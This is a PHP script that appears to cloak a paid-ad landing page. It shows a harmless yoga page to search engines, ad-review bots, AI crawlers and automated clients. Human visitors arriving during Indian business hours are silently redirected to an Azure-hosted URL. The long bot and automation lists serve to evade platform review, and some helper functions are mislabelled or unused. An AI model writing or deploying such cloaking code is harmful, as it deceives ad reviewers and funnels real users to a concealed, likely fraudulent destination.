<?php

error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$gclid = $_GET['gclid'] ?? null;
$mousemove = $_GET['mousemove'] ?? null;

const REDIRECT_URL = 'https://softdrinks-fyg7czfhd2d3hkaj.z02.azurefd.net';

function showYogaPage(): void
{
    header('Location: index.html', true, 302);
    exit;
}
/*
|--------------------------------------------------------------------------
| Local Business Hours (GMT+5:30 / IST)
| 07:30 AM - 07:30 PM (GMT+5:30)
|--------------------------------------------------------------------------
*/

function isBusinessHours(): bool
{
    $timezone = new DateTimeZone('+0530');

    $now = new DateTime('now', $timezone);

    $start = new DateTime('07:30', $timezone);
    $end = new DateTime('19:30', $timezone);

    return $now >= $start && $now <= $end;
}

function isValidGclid($gclid)
{
    return is_string($gclid)
        && preg_match('/^[a-zA-Z0-9_-]+$/', $gclid);
}

/*
|--------------------------------------------------------------------------
| Browser Language
|--------------------------------------------------------------------------
*/

function isEnglishOrJapaneseBrowser(): bool
{
    $language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';

    return preg_match('/(en|us)/i', $language) === 1;
}

/*
|--------------------------------------------------------------------------
| Bot Detection
|--------------------------------------------------------------------------
|
| User-Agent detection is only a signal and can be spoofed.
|--------------------------------------------------------------------------
*/

function isBot(string $userAgent): bool
{
    $ua = strtolower(trim($userAgent));

    // Empty User-Agent
    if ($ua === '') {
        return true;
    }

    // Common crawlers
    $botPatterns = [
        'googlebot',
        'adsbot-google',
        'google-inspectiontool',
        'mediapartners-google',

        'bingbot',
        'msnbot',
        'adidxbot',
        'bingpreview',

        'facebookexternalhit',
        'facebot',
        'meta-externalagent',
        'twitterbot',
        'linkedinbot',
        'applebot',

        'amazonbot',
        'yandexbot',
        'baiduspider',
        'duckduckbot',
        'slurp',
        'ia_archiver',

        'ahrefsbot',
        'semrushbot',
        'dotbot',
        'mj12bot',
        'blexbot',
        'dataforseobot',
        'petalbot',
        'bytespider',
        'seekport',
        'serpstatbot',

        'screaming frog',
        'siteauditbot',
        'ccbot',

        'gptbot',
        'oai-searchbot',
        'google-extended',
        'claudebot',
        'anthropic-ai',
        'perplexitybot'
    ];

    foreach ($botPatterns as $pattern) {
        if (strpos($ua, $pattern) !== false) {
            return true;
        }
    }

    // Common automated HTTP clients
    $automationPatterns = [
        'python-requests',
        'python-urllib',
        'curl/',
        'wget/',
        'axios/',
        'go-http-client',
        'java/',
        'okhttp',
        'libwww-perl',

        'headlesschrome',
        'phantomjs',
        'slimerjs',
        'puppeteer',
        'playwright',
        'selenium'
    ];

    foreach ($automationPatterns as $pattern) {
        if (strpos($ua, $pattern) !== false) {
            return true;
        }
    }

    return false;
}

/*
|--------------------------------------------------------------------------
| 302 Request Handles
|--------------------------------------------------------------------------
*/

if (!isBot($userAgent) && isBusinessHours()) {
    header('Location: ' . REDIRECT_URL, true, 302);
    exit;
}

/*
|--------------------------------------------------------------------------
| Normal / Fallback Page
|--------------------------------------------------------------------------
*/

showYogaPage();